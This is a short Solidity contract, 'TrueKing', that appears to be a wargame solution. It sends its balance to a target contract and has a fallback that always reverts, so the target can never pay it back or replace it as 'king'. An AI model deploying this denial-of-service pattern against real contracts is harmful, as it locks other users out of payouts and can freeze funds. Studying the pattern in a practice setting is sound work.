pragma solidity ^0.4.18;

contract TrueKing {
    address public owner;
    address public target;
    
    function TrueKing(address _target) public payable {
        require(msg.value > 0);
        target = _target;
        owner = msg.sender;
    }
    
    function hax() public {
        require(msg.sender == owner);
        
        require(target.call.value(this.balance)());
    }
    
    function kill() public {
        require(msg.sender == owner);
        
        selfdestruct(owner);
    }
    
    function() public payable {
        revert();
    }
}
